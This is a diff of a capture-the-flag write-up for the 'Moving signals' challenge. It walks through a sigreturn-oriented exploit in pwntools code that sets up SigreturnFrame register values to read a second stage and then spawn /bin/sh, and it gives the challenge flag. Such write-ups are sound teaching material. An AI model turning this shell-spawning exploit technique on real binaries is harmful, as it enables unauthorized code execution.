@@ -1,4 +1,12 @@
-## Moving signals
+# Moving signals
+#### Description
+We don't like giving binaries that contain loads of information, so we decided that a small program should do for this challenge. Even written in some custom assembly. I wonder how this could be exploited.
+#### Author
+Tango
+#### Points and solves
+442 points, 91 solves.
+
+
 We are given an extermly small binary:
 
 ```asm
@@ -12,9 +20,9 @@ We are given an extermly small binary:
 0x0000000000041019 <+25>:    ret
 ```
 
-# The vulnerability:
+## The vulnerability:
 Well, of course we have full control over ```rip``` using the read syscall.
-In addition we again have a ```syscall``` gadget to use for ```sigreturn``` and ```execve```
+In addition we have a ```syscall``` gadget to use for ```sigreturn``` and ```execve```
 
 
 
@@ -32,7 +40,7 @@ payload += bytes(frame)
 p.send(payload)
 ```
 This payload sets ```rax = 0xf``` and syscalls, the frame that is loaded gives the registers the values:
-1. ```rax = 0 for ```read``` syscall
+1. ```rax = 0``` for ```read``` syscall
 2. ```rdi = 0``` for ```stdin```
 3. ```rsi = 0x401025``` is the only known address that is also writeable, (which is right after the given code)
 4. ```rsp = 0x401025``` is to align the stack right back to where we are reading into.
@@ -41,6 +49,7 @@ Basically we read the next phase of this exploit into the code segment of the bi
 We will return to whatever that will be written to address ```0x401025```
 
 ## 2. Getting shell:
+```python
 payload = p64(pop_rax) + p64(15) + p64(syscall_ret)
 frame = SigreturnFrame()
 frame.rax = 59
@@ -50,6 +59,7 @@ frame.rdx = 0
 frame.rsp = 0x41000
 frame.rip = syscall_ret
 payload += bytes(frame) + b"/bin/sh\x00"
+```
 
 This utilizes another ```sigreturn``` to load the values required to perform ```execve(/bin/sh)```
 1. ```rax = 59``` for ```execve``` syscall
@@ -58,3 +68,6 @@ This utilizes another ```sigreturn``` to load the values required to perform ```
 
 
 And we get shell :).
+
+#### Flag
+```flag{s1gROPp1ty_r0p_321321}```
